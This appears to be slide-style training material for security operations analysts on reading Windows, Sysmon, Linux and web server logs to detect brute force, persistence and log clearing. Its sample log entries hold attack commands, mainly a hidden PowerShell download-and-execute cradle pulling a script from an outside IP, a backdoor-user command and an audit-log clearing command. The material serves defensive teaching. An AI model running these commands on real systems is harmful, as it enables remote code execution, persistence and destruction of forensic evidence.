◆ CORE DEFINITIONS

What is a Security Log?

A Log is an automatically generated, timestamped record of an event, action, or transaction that occurred within an operating system, application, or network device.

💡 The Golden Rule of Incident Response

"In cybersecurity, if an event was not logged, for all forensic and legal purposes, it never happened — and conversely, if an attacker acted on an endpoint, they left a digital trace in the logs."

1. Unalterable Witness

Records what code executed, who authenticated, what connection opened, and what file was modified.

2. Timeline Reconstruction

Allows investigators to recreate the exact step-by-step chronology of an attack from patient zero to data theft.

3. Compliance & Proof

Mandated by global security frameworks (ISO 27001, PCI-DSS, NIST) for accountability and incident reporting.

◆ LOG STRUCTURE

The 5 Forensic Pillars of a Log Entry

Whenever an analyst inspects any log in a SIEM, they immediately deconstruct it into five fundamental questions:

1. When? — Timestamp (UTC)

Exact date, time, and millisecond of occurrence. Must be synchronized across all systems via NTP in UTC.

2. Where? — Source & Destination

The hostname, source IP address and port, and the destination IP and port involved in the transaction.

3. What? — Event ID & Action

The standardized event identifier and action: Success, Failure, Process Create, Allowed, Denied, or Dropped.

4. Who? — User & Identity Context

The account name, Security Identifier (SID), Logon ID, process owner, or service account that initiated the activity.

5. Details & Payload (The 'How')

Contextual data: full command line arguments, process parent/child PIDs, file hashes (SHA-256), registry keys modified, or HTTP request URLs.

◆ DATA TRANSFORMATION

From Raw Text to Searchable Structured Intelligence

◆ ENTERPRISE TELEMETRY

Where Do Enterprise Logs Originate?

A resilient SOC ingests telemetry across all layers of the IT enterprise to eliminate blind spots:

1. Endpoint & Host Logs

Windows Event Logs, Linux Syslog, macOS unified logs, EDR sensor telemetry, and Sysmon process tracking.

2. Identity & Directory Logs

Active Directory domain controller events, Kerberos authentications, Azure AD / Okta SSO, and MFA failure logs.

3. Perimeter & Network Logs

Next-Gen Firewall allow/deny events, VPN connection logs, DNS resolver query logs, and Proxy web filters.

4. Web & Application Logs

Apache, Nginx, IIS access and error logs, database transaction logs (SQL Server, Oracle, PostgreSQL).

5. Security Tool Alerts

Antivirus detections, IDS/IPS alerts (Snort/Suricata), Email gateway spam/phishing verdicts.

6. Cloud & Infrastructure

AWS CloudTrail, Microsoft Azure Activity Logs, Google Cloud Audit logs, and Kubernetes control plane logs.

◆ WINDOWS INTERNALS

Windows Event Logging Architecture

Windows stores structured XML-based event logs in proprietary binary files with the .evtx extension located in C:\Windows\System32\winevt\Logs\:

Security.evtx

The Core SOC Log. Contains logon/logoff events, privilege use, user management, and process creation. Restricted to Administrator access only.

System.evtx

Records operating system component activity: driver loading, service starts/stops, system errors, and hardware changes.

Application.evtx

Events logged by installed software, databases, or local third-party applications (e.g., SQL server errors, browser crashes).

🔍 Modern Analytical & Operational Channels

Beyond the classic three, Windows includes specialized channels for incident response: Microsoft-Windows-Sysmon/Operational, Microsoft-Windows-PowerShell/Operational, and Microsoft-Windows-TaskScheduler/Operational.

◆ CRITICAL EVENT IDS

Essential Windows Security Event IDs

Every defensive analyst must memorize these primary Event IDs — they represent the foundation of all detection rules:

Event ID Event Name / Description Forensic Significance in a SOC
4624 Successful Account Logon Verify authentication source, username, and Logon Type (Local vs Network vs RDP).
4625 Failed Account Logon Detect Password Spraying, Brute-Force attacks, and unauthorized access attempts.
4672 Special Privileges Assigned Detect Administrator / Superuser logons and privilege escalation events.
4688 A New Process Has Been Created Track what executables spawned, parent processes, and command line arguments.
7045 A New Service Was Installed Detect adversary persistence and lateral movement tools (e.g., PsExec, malware services).
4720 A User Account Was Created Catch backdoor account creation by malicious actors or unauthorized admins.
1102 The Audit Log Was Cleared Critical red flag! Indicates an attacker attempting to cover their tracks.
◆ AUTHENTICATION ANALYSIS

Deconstructing Event ID 4624: The Logon Type Key

When an account authenticates successfully, Windows logs Event ID 4624. The single most important field for triage is the Logon Type:

Logon Type 2: Interactive

Physical Console Logon. The user sat physically in front of the machine and entered credentials on the local keyboard.

Logon Type 3: Network

Network Connection. Connection to shared folders (SMB/CIFS), network printers, or IIS web applications from another host.

Logon Type 10: RemoteInteractive

Remote Desktop (RDP). The user connected via Remote Desktop Services from a remote IP address across the network or WAN.

Logon Type 4: Batch

Scheduled tasks running in the background under a designated service account.

Logon Type 5: Service

A Windows background service starting up under its service account credentials.

Logon Type 9: NewCredentials

Used by runas /netonly — heavily abused by lateral movement tools like Mimikatz.

◆ AUTHENTICATION ANALYSIS

Detecting Brute Force Attacks: Event ID 4625

Logged whenever an authentication attempt fails. In a SOC, a burst of 4625 events indicates an active attack:

Substatus Code Hex Error Forensic Explanation & Attack Implication
STATUS_WRONG_PASSWORD 0xC000006A The username exists and is valid, but the password provided was incorrect. Indicates targeted credential guessing.
STATUS_NO_SUCH_USER 0xC0000064 The specified username does not exist. High volumes indicate username enumeration / dictionary attacks.
STATUS_ACCOUNT_LOCKED_OUT 0xC0000234 Account threshold exceeded. The attacker triggered the lockout policy after repeated failures.
STATUS_PASSWORD_EXPIRED 0xC0000071 Legitimate user whose password expired, or stale service account credentials.

🚨 SOC Triage Metric: Brute Force vs Password Spraying

Brute Force: 500 failed logons against 1 single account from 1 IP.
Password Spraying: 1 failed logon against 500 different accounts within 5 minutes using the same password (e.g. Spring2026!) to avoid lockout.

◆ PROCESS VISIBILITY

Process Execution Visibility: Event ID 4688

Logs every executable program spawned on the operating system. Crucial for tracing malware execution trees:

Parent Process (Creator)

Field: CreatorProcessName & ProcessId
Who launched the program? (e.g. C:\Windows\explorer.exe or suspicious parent like WINWORD.EXE).

Child Process (New Executable)

Field: NewProcessName & NewProcessId
What was launched? (e.g. C:\Windows\System32\cmd.exe or an unsigned binary in %APPDATA%).

⚠️ The Critical SOC Configuration: Command-Line Auditing

By default, Windows records the program path, but hides the command arguments. Security teams must enable Group Policy:
Computer Configuration -> Admin Templates -> System -> Audit Process Creation -> "Include command line in process creation events".
Without this, you see powershell.exe started, but miss the payload: powershell.exe -enc JABzAD0ATgBlAHcALQ...!

◆ ADVANCED ENDPOINT TELEMETRY

Why Default Windows Logs Leave Critical Blind Spots

Native Windows Security auditing was designed for compliance, not modern threat hunting. Attackers easily bypass it:

Blind Spot 1: No File Hashes

Windows Event 4688 logs the process name, but not its cryptographic hash (MD5, SHA256). If an attacker names their malware svchost.exe, you cannot distinguish it from the real OS binary!

Blind Spot 2: No Process-to-Network Binding

Windows firewall logs show an outbound IP connection, but cannot tell you which specific Process ID or executable made that network request!

Blind Spot 3: No Memory Injection Visibility

Default logs cannot detect code injection into legitimate processes (Process Hollowing, DLL Injection, Remote Thread Creation).

🛡️ The Solution: Microsoft Sysmon (System Monitor)

A free, lightweight Windows system service and device driver from Microsoft Sysinternals that remains resident across reboots to monitor and log advanced system activity directly into its own Windows Event Log channel: Microsoft-Windows-Sysmon/Operational.

◆ SYSMON TELEMETRY

Essential Sysmon Event IDs for Threat Hunting

Sysmon events provide the deepest endpoint visibility available without a commercial EDR agent:

Event ID 1: Process Creation

Extends native 4688 with: Hashes (MD5, SHA256), ParentCommandLine, CurrentDirectory, and full parent-child execution lineage.

Event ID 3: Network Connection

Records both TCP/UDP outbound and inbound connections, binding the remote IP/Port directly to the exact Image (executable) and ProcessGuid that initiated it!

Event ID 11: FileCreate

Logs when a file is created or written to disk. Essential for catching malware dropping secondary payloads, ransomware staging, or webshell creation.

Event ID 7: Image Loaded

Logs when a DLL is loaded into a process. Crucial for detecting DLL Hijacking and DLL Side-Loading attacks.

Event ID 12/13: Registry Event

Detects creation, deletion, or modification of sensitive registry persistence keys (e.g., Run keys, SafeBoot values).

Event ID 8: CreateRemoteThread

Detects a process injecting code into another separate process — the hallmark signature of Process Injection & Hollowing!

◆ LINUX TELEMETRY

Linux Logging Architecture & Key Log Files

Linux and UNIX systems leverage the Syslog protocol (RFC 5424) and systemd journal to manage system telemetry:

/var/log/auth.log

(or /var/log/secure on RHEL/CentOS). Authentication events, SSH logins, sudo command executions, and PAM module failures.

/var/log/syslog

(or /var/log/messages). General operational messages from system services, kernel drivers, and background daemons.

journalctl (systemd)

Binary structured log database for modern Linux distributions. Queryable via:
journalctl -u ssh.service -n 50

Sample Failed SSH Login in /var/log/auth.log

auth.log (SSH Brute Force Signature)

◆ APPLICATION SECURITY

Dissecting Web Server Access Logs (Combined Log Format)

Web servers generate access logs documenting every HTTP/HTTPS request sent to your organization's web applications:

Nginx / Apache Combined Access Log Anatomy

Field Name Sample Value What It Tells the SOC Analyst
Client IP (Source) 198.51.100.24 Who sent the request? Check reputation against AbuseIPDB or VirusTotal.
HTTP Method & URI POST /api/v1/transfer What endpoint was targeted? Look for path traversal (../) or SQL syntax.
HTTP Status Code 403 (Forbidden) Did the attack succeed? 200 (Success), 403 (Blocked/Forbidden), 500 (Server Error/Crash).

◆ REAL-WORLD ATTACK TRACING

Detecting the Attack Chain: Brute-Force & Breach

In a real SOC, an attack does not arrive as a neat alert — it unfolds across a chronological sequence of events:

1

Burst of Event 4625

Failed Logons. 250 failed authentications targeting account svc_backup within 90 seconds. Error: 0xC000006A.

2

Single Event 4624

Logon Success! At 02:14:11, authentication succeeds! LogonType=3 originating from IP 10.0.4.88.

3

Immediate Event 4672

Privilege Escalation. SeDebugPrivilege and SeTcbPrivilege assigned to the newly logged-in session.

4

Event 4688 / Sysmon 1

Malicious Spawning. The session executes whoami /priv followed by net user /add backdoor user.

🧠 The SIEM Correlation Rule Logic

IF count(EventID=4625) > 20 FROM same(SrcIP) WITHIN 2 min FOLLOWED BY EventID=4624 WITH same(TargetUser) THEN TRIGGER "CRITICAL: Successful Brute-Force Attack Detected"

◆ REAL-WORLD ATTACK TRACING

Detecting Malware Persistence: Event ID 7045

Attackers create Windows Services to ensure their backdoor starts automatically on every system boot:

Security / System Event Log — Event ID 7045
Log Name: System Source: Service Control Manager Event ID: 7045 Level: Information User: SYSTEM Description: A service was installed in the system. Service Name: WindowsDefenderUpdateHelper Service File Name: powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.99/payload.ps1')" Service Type: user mode service Service Start Type: auto start Service Account: LocalSystem

🔍 3 Immediate Red Flags in This Single Log Entry

1. Masquerading Name: Poses as "WindowsDefenderUpdateHelper" to trick casual administrators.
2. Suspicious Binary: Service File Name launches powershell.exe with hidden flags instead of a compiled .exe service.
3. Remote Cradle: Downloads and executes a live unverified script directly from an external untrusted IP!

◆ DEFENSE EVASION

Catching Anti-Forensics: Event ID 1102 & 104

When sophisticated attackers compromise an endpoint, they often attempt to erase the audit trail to prevent investigation:

Security Log Cleared: Event ID 1102

Logged in Security.evtx whenever an administrator or attacker clears the security log via Event Viewer or command:
wevtutil cl Security or Clear-EventLog.

System Log Cleared: Event ID 104

Logged in System.evtx whenever the System or Application log channels are cleared by a user or script.

Security Event Log — Event ID 1102 (The Audit Log Was Cleared)
Log Name: Security Source: Microsoft-Windows-Eventlog Event ID: 1102 User: CORP\compromised_admin Description: The audit log was cleared. Subject: Security ID: S-1-5-21-392817291-1029381-1001 Account Name: compromised_admin Domain: CORP Logon ID: 0x14F92B

🚨 The Irony of Log Clearing

An attacker can erase previous events, but Windows automatically records who erased them in Event 1102! In a mature SOC, Event 1102 triggers an immediate Tier-3 Incident Response engagement.

◆ SOC ENGINEERING

Best Practices for Enterprise Log Integrity

A SOC is only as reliable as the integrity of the data it ingests. Three architectural mandates must be enforced:

1. Real-Time Forwarding

Never leave logs exclusively on the local endpoint! Forward telemetry within seconds to the central SIEM. If an attacker wipes the laptop, the SIEM still holds the complete record.

2. Clock Synchronization

Enforce strict NTP (Network Time Protocol) synchronization across all domains in UTC. Clock drift of even 10 seconds destroys correlation rules and timeline evidence!

3. WORM Storage & RBAC

Store archived logs in Write-Once-Read-Many (WORM) storage. Restrict SIEM access so even Domain Admins cannot delete log archives without multi-party approval.

📋 Retention Guidelines (NIST SP 800-92)

Keep active searchable logs in the SIEM for at least 90 days (hot storage), and archived compressed logs for at least 365 days (1 year) in cold storage for advanced threat investigations.
